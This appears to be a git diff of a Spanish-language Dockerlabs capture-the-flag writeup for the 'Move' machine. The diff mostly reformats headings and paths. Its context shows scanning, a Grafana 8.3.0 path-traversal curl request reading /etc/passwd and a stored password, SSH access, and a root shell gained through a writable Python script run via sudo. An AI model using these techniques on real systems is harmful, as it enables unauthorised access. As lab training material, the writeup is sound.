@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Move 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Move ​​
+
+## 🖥️ Writeup - Move
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Gobuster` `Searchsploit` `Directory Traversal` `Arbitrary File Read` `Python` `Sudoers` `Writable File`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip move.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh move.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80,3000 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 15:45 +0100
 Nmap scan report for 172.17.0.2
@@ -88,7 +97,7 @@ Identificamos los puertos `22`, `80` y `3000` abiertos.
 
 Accedemos al servicio web del puerto `80` y nos encontramos con una página de `Apache2` por defecto.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -97,6 +106,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -132,7 +142,7 @@ No podemos avanzar más a través del puerto `80`, por lo que pasamos a inspecci
 
 Accedemos al puerto `3000`.
 
-![alt text](../../images/grrafana.png)
+![alt text](../../.gitbook/assets/grrafana.png)
 
 Nos encontramos con un panel de `login` de `Grafana`, en el cual también podemos visualizar la `versión` en la parte inferior de la pantalla.
 
@@ -147,6 +157,7 @@ searchsploit grafana 8.3.0
 ```
 
 Info:
+
 ```
 ------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                |  Path
@@ -158,7 +169,7 @@ Shellcodes: No Results
 
 Encontramos un exploit para una vulnerabilidad de `Directory Traversal and Arbitrary File Read`, que nos permitiría leer el contenido de archivos del sistema, como `/etc/passwd` o el `/tmp/pass.txt` descubierto anteriormente.
 
-# EXPLOTACIÓN
+## EXPLOTACIÓN
 
 Nos copiamos el exploit en nuestro directorio actual.
 
@@ -173,6 +184,7 @@ nano 50581.py
 ```
 
 Info:
+
 ```py
 import requests
 import argparse
@@ -264,6 +276,7 @@ curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../..
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -301,6 +314,7 @@ curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../..
 ```
 
 Info:
+
 ```
 t9sH76gpQ82UFeZ3GXZS
 ```
@@ -312,21 +326,23 @@ ssh freddy@172.17.0.2
 ```
 
 Info:
+
 ```
 (freddy㉿185b3883a185)-[~]
 └─$ id
 uid=1000(freddy) gid=1000(freddy) groups=1000(freddy)
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for freddy on 185b3883a185:
     env_reset, mail_badpass,
@@ -345,6 +361,7 @@ ls -la
 ```
 
 Info:
+
 ```
 total 12
 drwxrwxrwx 1 root   root   4096 Mar 29  2024 .
@@ -361,6 +378,7 @@ nano maintenance.py
 ```
 
 Código:
+
 ```py
 import os
 import pty
@@ -375,6 +393,7 @@ sudo -u root /usr/bin/python3 /opt/maintenance.py
 ```
 
 Info:
+
 ```
 (root㉿185b3883a185)-[/opt]
 └─# whoami
